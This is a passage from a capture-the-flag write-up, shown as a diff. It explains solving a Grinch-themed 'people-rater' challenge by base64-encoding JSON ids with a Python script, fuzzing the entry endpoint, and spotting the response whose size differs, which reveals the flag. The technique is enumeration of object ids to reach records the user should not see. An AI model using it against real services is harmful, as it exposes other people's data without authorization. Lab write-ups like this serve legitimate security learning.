@@ -33,3 +33,46 @@ In `/apps-home`, it shows the boxes of all the different challenges:</br>
 9 /evil-quiz: Just how evil are you? Take the quiz and see! Just don't go poking around the admin area!
 10 /signup-manager: You've made it this far! The grinch is recruiting for his army to ruin the holidays but they're very picky on who they let in!
 ```
+Looking at `/people-rater`, it shows a list of people. When clicked on a person it will show a Javascript alert with the Grinch's opinion of that person.</br>
+When inspecting the Javascript code, it refers to `/entry/?id=` + the data-id.</br>
+The id's seem to be base64 encoded. Hence, first I decoded one example to understand what the encoded string contains: `{"id":1}`</br>
+I had a list of 1000 numbers, hence I created a Python script to use that list to create a list in the above format:
+```
+import base64
+
+# Read numbers from file
+with open('1000_numbers.txt', 'r') as file:
+    numbers = [int(line.strip()) for line in file]
+
+# Convert numbers to base64
+base64_list = [base64.b64encode((str('{"id":') + str(num) + str('}')).encode()).decode() for num in numbers]
+
+# Save base64 representations to file
+with open('1000_numbers_base64.txt', 'w') as output_file:
+    for base64_num in base64_list:
+        output_file.write(base64_num + '\n')
+```
+Once I had the list, I fuzz the id's, with the following result:</br>
+```
+eyJpZCI6OH0=            [Status: 200, Size: 62, Words: 2, Lines: 1]
+eyJpZCI6M30=            [Status: 200, Size: 66, Words: 2, Lines: 1]
+eyJpZCI6MTV9            [Status: 200, Size: 62, Words: 2, Lines: 1]
+eyJpZCI6Nn0=            [Status: 200, Size: 68, Words: 2, Lines: 1]
+eyJpZCI6Mn0=            [Status: 200, Size: 57, Words: 2, Lines: 1]
+eyJpZCI6MTF9            [Status: 200, Size: 69, Words: 2, Lines: 1]
+eyJpZCI6MTN9            [Status: 200, Size: 62, Words: 2, Lines: 1]
+eyJpZCI6N30=            [Status: 200, Size: 66, Words: 2, Lines: 1]
+eyJpZCI6NX0=            [Status: 200, Size: 63, Words: 2, Lines: 1]
+eyJpZCI6MTB9            [Status: 200, Size: 66, Words: 2, Lines: 1]
+eyJpZCI6NH0=            [Status: 200, Size: 62, Words: 2, Lines: 1]
+eyJpZCI6MTd9            [Status: 200, Size: 64, Words: 2, Lines: 1]
+eyJpZCI6MTR9            [Status: 200, Size: 58, Words: 2, Lines: 1]
+eyJpZCI6MTJ9            [Status: 200, Size: 59, Words: 2, Lines: 1]
+eyJpZCI6MX0=            [Status: 200, Size: 169, Words: 6, Lines: 1]
+eyJpZCI6OX0=            [Status: 200, Size: 66, Words: 2, Lines: 1]
+eyJpZCI6MTZ9            [Status: 200, Size: 62, Words: 2, Lines: 1]
+```
+One line item stands out with the size: `eyJpZCI6MX0=`</br>
+Going to `/people-rater/entry/?id=eyJpZCI6MX0=` it will show the flag.</br>
+
+## Solution 4th flag
